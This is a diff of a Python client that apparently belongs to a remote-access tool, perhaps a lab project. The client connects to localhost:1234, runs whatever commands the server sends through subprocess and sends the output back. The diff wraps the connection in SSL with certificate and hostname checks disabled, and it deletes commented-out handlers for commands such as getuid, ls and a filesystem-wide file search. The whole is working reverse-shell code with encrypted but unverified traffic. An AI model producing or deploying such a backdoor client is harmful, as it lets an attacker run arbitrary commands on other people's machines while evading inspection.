@@ -1,21 +1,16 @@
 import socket
+import ssl
 import subprocess
 import os
 
 
-# def recv_all(sock, length):
-#     data = b''
-#     while len(data) < length:
-#         more = sock.recv(length - len(data))
-#         if not more:
-#             raise EOFError(
-#                 'Expected %d bytes but only received %d bytes before the socket closed' % (length, len(data)))
-#         data += more
-#     return data
-
-
 def connect_to_server():
+    context = ssl.create_default_context()
+    context.check_hostname = False  # Désactiver la vérification du nom d'hôte
+    context.verify_mode = ssl.CERT_NONE  # Désactiver la vérification du certificat
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s = context.wrap_socket(s, server_hostname='localhost')  # Envelopper le socket avec SSL
     s.connect(('localhost', 1234))
 
     # get on which OS the client is running
@@ -86,31 +81,6 @@ def connect_to_server():
                 if not output:
                     output = "No output"
                 s.send(output.encode('utf-8'))
-        #
-        #
-        # if command.lower() == "getuid":
-        #     output = subprocess.getoutput(command.lower())
-        #     s.send(output.encode('utf-8'))
-        #
-        # if command.lower() == "ipconfig":
-        #     output = subprocess.getoutput("ip a")
-        #     s.send(output.encode('utf-8'))
-        #
-        # if command.lower() == "ls":
-        #     output = subprocess.getoutput("ls")
-        #     s.send(output.encode('utf-8'))
-        #
-        # if command.lower() == "pwd":
-        #     output = subprocess.getoutput("pwd")
-        #     s.send(output.encode('utf-8'))
-        #
-        # if command.lower().startswith("search"):
-        #     searched_file = command.split(" ")[1]
-        #     print(f"Searching for {searched_file}...")
-        #     output = subprocess.getoutput(f"find / -name {searched_file} 2>/dev/null")
-        #     s.send(output.encode('utf-8'))
-
-        # print(f"Executing command: {command}")
         else:
             output = subprocess.getoutput(command.lower())
             s.send(output.encode('utf-8'))
